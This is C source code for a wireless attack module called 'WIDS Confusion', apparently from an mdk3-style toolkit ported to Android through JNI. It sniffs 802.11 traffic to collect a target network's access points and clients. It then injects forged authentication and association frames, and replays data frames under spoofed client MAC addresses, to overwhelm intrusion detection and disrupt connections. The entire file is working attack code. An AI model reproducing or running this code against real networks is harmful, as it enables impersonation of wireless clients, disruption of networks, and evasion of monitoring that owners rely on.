#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <pthread.h>

#include "mywids.h"
#include "osdep.h"
#include "helpers.h"
#include "channelhopper.h"
#include "linkedlist.h"
#include "infomessage.h"
#include "widsstop.h"

#define WIDS_MODE 'w'
#define WIDS_NAME "WIDS Confusion"
#define WIDS_MAX_RETRIES 10

struct wids_options {
  char *target;
  int zerochaos;
  int speed;
  int aps;
  int foreign_aps;
  int clients;
  int auths;
  int deauths;
};

//Global things, shared by packet creation and stats printing
struct clistwidsap *targets = NULL, *foreign = NULL, *belongsto = NULL;
struct clistwidsclient *target_clients = NULL;
uint8_t *p;



void *wids_parse(char* myssid, int use_chan_hopping, int use_zero_chaos) {
  int opt, speed;
  char *speedstr;
  struct wids_options *wopt = malloc(sizeof(struct wids_options));

  wopt->target = NULL;
  wopt->zerochaos = 0;
  wopt->speed = 100;
  wopt->aps = wopt->clients = wopt->auths = wopt->deauths = wopt->foreign_aps = 0;

  wopt->target = malloc(strlen(myssid) + 1); 
  strcpy(wopt->target, myssid);

  if(use_chan_hopping) {
    speed = 3000000;
    init_channel_hopper(NULL, speed);
  }

  if(use_zero_chaos)
    wopt->zerochaos = 1;

  return (void *) wopt;
}

void wids_sniffer(void *options) {
  struct wids_options *wopt = (struct wids_options *) options;
  struct packet sniff;
  struct ieee_hdr *hdr;
  char *ssid;
  struct ether_addr *bssid, *client;
  struct auth_fixed *auth;
  struct clistwidsclient *wclient;
  JNIEnv* env;
  char myy_info_buffer[1024];

  (*jvm)->AttachCurrentThread(jvm, &env, NULL);

  while(1) {
    sniff = osdep_read_packet();
    hdr = (struct ieee_hdr *) sniff.data;
    if(stop_attackwids)
      break;
    switch (hdr->type) {
      case IEEE80211_TYPE_BEACON:
        ssid = get_ssid(&sniff, NULL);
        bssid = get_bssid(&sniff);
        if (!strcmp(ssid, wopt->target)) {
          if (! search_bssid(targets, *bssid)) {
            targets = add_to_clistwidsap(targets, *bssid, osdep_get_channel(), get_capabilities(&sniff), ssid);

            p = bssid->ether_addr_octet;
            snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Found AP for target network: %02X:%02X:%02X:%02X:%02X:%02X on channel %d\n", p[0], p[1], p[2], p[3], p[4], p[5], osdep_get_channel());
            info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);

            printf("\rFound AP for target network: "); print_mac(*bssid); printf(" on channel %d\n", osdep_get_channel());
            wopt->aps++;
          }
        } else {
          if (wopt->zerochaos && (! search_bssid(foreign, *bssid))) {
            foreign = add_to_clistwidsap(foreign, *bssid, osdep_get_channel(), get_capabilities(&sniff), ssid);

            p = bssid->ether_addr_octet;
            snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Found foreign AP %02X:%02X:%02X:%02X:%02X:%02X in network %s on channel %d\n", p[0], p[1], p[2], p[3], p[4], p[5], ssid, osdep_get_channel());
            info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);

            printf("\rFound foreign AP "); print_mac(*bssid); printf(" in network %s on channel %d\n", ssid, osdep_get_channel());
            wopt->foreign_aps++;
          }
        }
        free(ssid);
      break;
      case IEEE80211_TYPE_DATA:
      case IEEE80211_TYPE_QOSDATA:
        client = NULL;
        if ((hdr->flags & 0x03) == 0x01) {
          client = get_source(&sniff);
        } else if ((hdr->flags & 0x03) == 0x02) {
          client = get_destination(&sniff);
        }
        if (client) {
          bssid = get_bssid(&sniff);
          if ((belongsto = search_bssid(targets, *bssid))) {
            if (! search_client(target_clients, *client)) {
              target_clients = add_to_clistwidsclient(target_clients, *client, 0, sniff.data, sniff.len, get_seqno(&sniff), NULL); //NULL: doesnt yet belong to any AP
              
              p = client->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Found client %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);        

              p = bssid->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "on AP %02X:%02X:%02X:%02X:%02X:%02X\n\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);          

              printf("\rFound client "); print_mac(*client); printf(" on AP "); print_mac(*bssid); printf("\n");
              wopt->clients++;
            }
          }
        }
      break;
      case IEEE80211_TYPE_AUTH:
        auth = (struct auth_fixed *) (sniff.data + sizeof(struct ieee_hdr));
        client = get_destination(&sniff);
        bssid = get_bssid(&sniff);
        if ((auth->seq == htole16((uint16_t) 2)) && (auth->status == 0)) {
          wclient = search_client(target_clients, *client);
          if (wclient) {
            if (MAC_MATCHES(*bssid, wclient->bssid->bssid))     //Doesnt match: Real client tried connecting somewhere else, ignore
              if (wclient->status == 0) wclient->status = 1;
          }
        }
      break;
      case IEEE80211_TYPE_ASSOCRES:
        client = get_destination(&sniff);
        bssid = get_bssid(&sniff);
        wclient = search_client(target_clients, *client);
        if (wclient && (wclient->status == 1)) {
          if (MAC_MATCHES(*bssid, wclient->bssid->bssid)) {
            wclient->status = 2;
            wopt->auths++;

            p = client->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Connected %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env); 

              p = (wclient->bssid->bssid).ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "to AP %02X:%02X:%02X:%02X:%02X:%02X\n\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env); 

            printf("\rConnected "); print_mac(*client); printf(" to AP "); print_mac(wclient->bssid->bssid); printf("\n");
          }
        }
      break;
      case IEEE80211_TYPE_DISASSOC:
      case IEEE80211_TYPE_DEAUTH:
        client = get_destination(&sniff);
        bssid = get_bssid(&sniff);
        wclient = search_client(target_clients, *client);
        if (wclient) {
          if (wclient->bssid && MAC_MATCHES(*bssid, wclient->bssid->bssid)) {
            wclient->status = 0;
            wclient->bssid = NULL;

            p = client->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Client %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);   

              p = bssid->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "kicked from fake-connected AP %02X:%02X:%02X:%02X:%02X:%02X\n\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);  

            printf("\rClient "); print_mac(*client); printf(" kicked from fake-connected AP "); print_mac(*bssid); printf("\n");
          } else {

            p = client->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Client %02X:%02X:%02X:%02X:%02X:%02X\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);   

              p = bssid->ether_addr_octet;
              snprintf(myy_info_buffer, sizeof(myy_info_buffer), "kicked from original AP %02X:%02X:%02X:%02X:%02X:%02X\n\n", p[0], p[1], p[2], p[3], p[4], p[5]);
              info_message_thread(myy_info_buffer, UPDATE_RUNNING, env);    

            printf("\rClient "); print_mac(*client); printf(" kicked from original AP "); print_mac(*bssid); printf("\n");
          }
          wopt->deauths++;
        }
      break;
    }
  }
    (*jvm)->DetachCurrentThread(jvm);

}

struct clistwidsclient *handle_retries(struct clistwidsclient *in) {
  if (!in) return NULL;

  in->retries++;
  if (in->retries > WIDS_MAX_RETRIES) {
    in->bssid = NULL;
    in->status = 3;     //Postpone client to the end
    in->retries = 0;
    return NULL;
  }

  //We also hate WIDS vendors here :D
  set_seqno(NULL, in->seq); //Have a nice day
  in->seq++;

  return in;
}

struct packet wids_getpacket(void *options) {
  static int wids_init = 0;
  static pthread_t sniffer;
  struct wids_options *wopt = (struct wids_options *) options;
  struct packet pkt;
  struct clistwidsclient *wclient;
  struct ieee_hdr *hdr;
  char myy_info_buffer[1024];

  if (!wids_init) {

    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Waiting 10 seconds for initialization...\n");
    info_message(myy_info_buffer, UPDATE_RUNNING); 

    printf("\nWaiting 10 seconds for initialization...\n");


    pthread_create(&sniffer, NULL, (void *) wids_sniffer, (void *) wopt);

        for (wids_init=0; wids_init<10; wids_init++) {
            sleep(1);
if(stop_attackwids)
      break;
            snprintf(myy_info_buffer, sizeof(myy_info_buffer), "APs found: %d   Clients found: %d\n", wopt->aps, wopt->clients);
            info_message(myy_info_buffer, UPDATE_RUNNING);
            printf("\rAPs found: %d   Clients found: %d", wopt->aps, wopt->clients);
        }

        while (! wopt->aps) {
          if(stop_attackwids)
      break;
            snprintf(myy_info_buffer, sizeof(myy_info_buffer), "No APs have been found yet, waiting...\n");
            info_message(myy_info_buffer, UPDATE_RUNNING);

            printf("\rNo APs have been found yet, waiting...\n");
            sleep(1);
        }
        while (wopt->zerochaos && (! wopt->foreign_aps)) {
          if(stop_attackwids)
      break;
            snprintf(myy_info_buffer, sizeof(myy_info_buffer), "No foreign APs have been found yet, waiting...\n");
            info_message(myy_info_buffer, UPDATE_RUNNING);

            printf("\rNo foreign APs have been found yet, waiting...\n");
            sleep(1);
        }
        while (! wopt->clients) {
          if(stop_attackwids)
      break;
            snprintf(myy_info_buffer, sizeof(myy_info_buffer), "Only APs found, no clients yet, waiting...\n");
            info_message(myy_info_buffer, UPDATE_RUNNING);

            printf("\rOnly APs found, no clients yet, waiting...\n");
            sleep(1);
        }
        wids_init = 1;
  }

  while(1) {
    if(stop_attackwids)
      break;
    sleep_till_next_packet(wopt->speed);
    target_clients = shuffle_widsclients(target_clients);

    //Associate a client that just authenticated
    wclient = search_status_widsclient(target_clients, 1, osdep_get_channel());
    wclient = handle_retries(wclient);
    if (wclient) return create_assoc_req(wclient->mac, wclient->bssid->bssid, wclient->bssid->capa, wclient->bssid->ssid, 54);

    //Send data as client that just connected
    wclient = search_status_widsclient(target_clients, 2, osdep_get_channel());
    wclient = handle_retries(wclient);
    if (wclient) { //injecting data
      memcpy(pkt.data, wclient->data, wclient->data_len);
      pkt.len = wclient->data_len;
      hdr = (struct ieee_hdr *) pkt.data;
      hdr->flags &= 0xFC;  // Clear DS field
      hdr->flags |= 0x01; // Set ToDS bit
      hdr->addr1 = wclient->bssid->bssid;
      hdr->addr2 = wclient->mac;
      MAC_SET_BCAST(hdr->addr3);
      wclient->status = 3;
      return pkt;
    }

    //Search idle client, auth to random AP, if nobody idle, connect already connected stations to even more APs
    wclient = search_status_widsclient(target_clients, 0, -1);
    if (!wclient) wclient = search_status_widsclient(target_clients, 3, -1);
    if (wclient) {
      wclient->retries = 0;
      if (wopt->zerochaos) {
        foreign = shuffle_widsaps(foreign);
        wclient->bssid = search_bssid_on_channel(foreign, osdep_get_channel());
      } else {
        targets = shuffle_widsaps(targets);
        wclient->bssid = search_bssid_on_channel(targets, osdep_get_channel());
      }
      if (wclient->bssid) return create_auth(wclient->bssid->bssid, wclient->mac, 0);
    }

    snprintf(myy_info_buffer, sizeof(myy_info_buffer), "All clients stuck in Authentication cycles, waiting for timeouts.\n");
    info_message(myy_info_buffer, UPDATE_RUNNING);

    printf("\rAll clients stuck in Authentication cycles, waiting for timeouts.");
  }

  pkt.len = 0;
  return pkt;
}

void wids_print_stats(void *options) {
  struct wids_options *wopt = (struct wids_options *) options;
  char myy_info_buffer[1024];

snprintf(myy_info_buffer, sizeof(myy_info_buffer), "APs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n\n", wopt->aps, wopt->clients, wopt->auths, wopt->deauths);
    info_message(myy_info_buffer, UPDATE_RUNNING);

  printf("\rAPs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n", wopt->aps, wopt->clients, wopt->auths, wopt->deauths);
}

void wids_perform_check(void *options) {
  //Nothing to check
  options = options; //Avoid unused warning
}

struct attacks load_wids() {
  struct attacks this_attack;
  char *wids_name = malloc(strlen(WIDS_NAME) + 1);
  strcpy(wids_name, WIDS_NAME);


  this_attack.parse_options = (fpo) wids_parse;
  this_attack.get_packet = (fpp) wids_getpacket;
  this_attack.print_stats = (fps) wids_print_stats;
  this_attack.perform_check = (fps) wids_perform_check;
  this_attack.mode_identifier = WIDS_MODE;
  this_attack.attack_name = wids_name;

  return this_attack;
}
